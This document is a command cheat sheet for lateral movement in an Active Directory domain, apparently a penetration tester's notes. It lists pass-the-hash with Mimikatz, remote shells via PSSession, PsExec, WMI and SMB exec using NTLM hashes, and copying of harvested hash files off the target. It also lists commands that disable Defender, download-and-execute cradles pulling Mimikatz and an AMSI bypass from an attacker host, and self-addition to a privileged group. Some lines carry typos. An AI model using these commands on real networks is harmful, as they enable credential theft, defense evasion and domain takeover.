### Powershell Base Lateral Movement on Active directory environment 

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:sqlsvc /domain:insomnia.io /ntlm:6A8AFBEE12A960731412582DC50CF614 /run:powershell.exe"'
$sess = New-PSSession -ComputerName PC-John
Enter-PSSession $sess
or 
.\PsExec64.exe -s \\PC-John powershell.exe
```

### File Upload to target through PSSession
```
Copy-Item -ToSession $sess .\ADModule-master.zip -Destination C:\Users\sqlsvc\Downloads
Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\SharpView.exe -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\powerview-dev.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\PowerUpSQL.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
Copy-Item -Path C:\Users\NyaMeeEain\Desktop\Tools\Invoke-SMBEnum.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)

```
### Download From Target to Local
```
Set-ItemProperty -Path C:\Ubuntu\rootfs\root\sqlsrv02.keytab -Name Attributes -Value Normal
Set-ItemProperty -Path C:\Users\Administrator\Documents\hashes.asreproast -Name Attributes -Value Normal
Copy-Item -FromSession $sess -Path C:\Users\Administrator\Documents\hashes.asreproast -Destination C:\Users\itemployee35\Desktop\Tools\ -Force

```

### NTLM hash and command execution Through WMI
```
Invoke-WMIExec -Target it-sqlsrv02 -Domain insomnia.io -Username sqlsvc  -Hash 6A8AFBEE12A960731412582DC50CF614 -Command "ipconfig" -verbose
Invoke-WMIExec -Target insomnia.io -Domain insomnia.io -Username sqlsvc  -Hash 6A8AFBEE12A960731412582DC50CF614 -Command "whoami"
Invoke-WMIExec -Target insomnia.io -Domain insomnia.io -Username sqlsvc  -Hash 6A8AFBEE12A960731412582DC50CF614 -Command "hostname" 
```
### OS Command execute  through SMBExec 
```
Invoke-SMBExec -Target TARGET -Domain DOMAIN -Username USERNAME -Hash HASH -Command "COMMAND" -verbose
Invoke-SMBExec -Target insomnia.io -Domain insomnia.io -Username sqlsvc -Hash 7782d820e5e5952b20b77a2240a03bbc -Command "powershell.exe Invoke-Webrequest 192.168.0.89" -verbose

Invoke-SMBExec -Target insomnia.io -Domain insomnia.io -Username sqlsvc -Hash 7782d820e5e5952b20b77a2240a03bbc -Command "hostname" -verbose
Invoke-SMBEnum  -Target insomnia.io -Domain insomnia.io -Username sqlsvc -Hash 7782d820e5e5952b20b77a2240a03bbc -Action  Share
Invoke-SMBEnum  -Target insomnia.io -Domain insomnia.io -Username sqlsvc -Hash 7782d820e5e5952b20b77a2240a03bbc -Action  Group

```
### Powershell Credential Variable
```
$username = 'John\administrator'
$password = '123456!@Z'
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList @($username,(ConvertTo-SecureString -String $password -AsPlainText -Force))

PassWD = ConvertTo-SecureString 'Vend0r'sDatabaseSecret' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ('msp\mspdb', $PassWD)

$Pivot = New-PSSession Sanda.insomnia.local -Credential $credential
Invoke-command -scriptblock{hostname} -Session $Pivot

$Int = New-PSSession -Computername Sanda.insomnia.local -Credential $credential
Enter-PSSession $Int
```

### PS Execution directly
```
Set-MpPreference -DisableRealtimeMonitoring $true
iwr -UseBasicParsing http://192.168.100.35/ADModule-master.zip -OutFile ADModule-master.zip
iex (iwr -UseBasicParsing http://192.168.100.35/amsi.txt)
iex (iwr -UseBasicParsing http://192.168.100.35/Invoke-Mimikatz.ps1)
iex (iwr -UseBasicParsing http://192.168.100.35/powerview-dev.ps1)
iex (iwr -UseBasicParsing http://192.168.100.35/Invoke-Mimikatz.ps1)
iex (iwr -UseBasicParsing http://192.168.100.35/Invoke-SMBEnum.ps1)
```

### Adding youself into Active Directory Groups 
**Upon Enumerating, If you have been permitted to add youself into higher privilege group**
```
$PassWd = ConvertTo-SecureString 'Vend0r''sDatabaseSecret' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ('Ins0mnia\MeMe', $PassWd)
$Adding = Get-ADUser -Identity Myself -Server insomnia.io -Credential $credential
Add-ADGroupMember -Identity Managers -Members $Adding -Server internal.insomnial -Verbose -Credential $credentia
```
